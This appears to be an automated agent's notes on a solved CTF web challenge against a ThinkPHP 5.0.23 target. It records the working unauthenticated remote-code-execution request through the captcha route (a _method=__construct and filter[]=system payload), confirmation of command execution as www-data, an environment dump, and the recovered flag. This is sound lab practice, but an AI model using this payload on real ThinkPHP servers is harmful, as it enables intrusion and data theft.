---
name: AutoNotes direct-ctf2.dasctf.com:27865
fingerprint: http://direct-ctf2.dasctf.com:27865 Target: http://direct-ctf2.dasctf.com:27865
This is a CTF challenge web service ([ThinkPHP]5.0.23-Rce). Exploit it to obtain the flag.
The flag is stored inside the target container: usually an environment variable named FLAG, or a file such as /flag. Report the exact flag value.
Do not attack the CTF platform itself; only this target is in scope.
status: validated
updated_at: 2026-09-23T12:11:03.697108+00:00
---

LOCK: ThinkPHP 5.0.23 unauthenticated RCE via the captcha route; flag lives in the container FLAG env var, read it with system(echo $FLAG).
CONFIRMED: ThinkPHP 5.0.23 RCE via POST /index.php?s=captcha with _method=__construct&filter[]=system&method=get&get[]=<cmd>; `echo $FLAG` returned CTF2{9516…88ee}
ANGLES: [miss] ThinkPHP 5.0.x RCE via index/think\app/invokefunction route; [hit] ThinkPHP 5.0.23 RCE via POST /index.php?s=captcha _method=__construct&filter[]=system route; [hit] Read FLAG env var / /flag file via command execution
TARGET: http://direct-ctf2.dasctf.com:27865
GOAL: Target: http://direct-ctf2.dasctf.com:27865
This is a CTF challenge web service ([ThinkPHP]5.0.23-Rce). Exploit it to obtain the flag.
The flag is stored inside the target container: usually an environment variable named FLAG, or a file such as /flag. Report the exact flag value.
Do not attack the CTF platform itself; only this target is in scope.
OUTCOME: Exploited the ThinkPHP 5.0.23 unauthenticated RCE and extracted the flag.

- **LOCK (n2)**: ThinkPHP 5.0.23 unauthenticated RCE via the captcha route; flag in the container `FLAG` env var.
- **Confirmed fact (n1, e005)**: `POST /index.php?s=captcha` with `_method=__construct&filter[]=system&method=get&get[]=<cmd>` → RCE; `echo $FLAG` returned `CTF2{9516…88ee}`, and the `env` dump showed `FLAG=CTF2{9516…88ee}`.
- **Angles**: n3 (invokefunction route) MISS — HTTP 404 (e004); n4 (captcha route RCE) HIT — `uid=33(www-data)` (e004); n5 (read FLAG/file) HIT (e005).

Exact flag value: **CTF2{9516…88ee}**
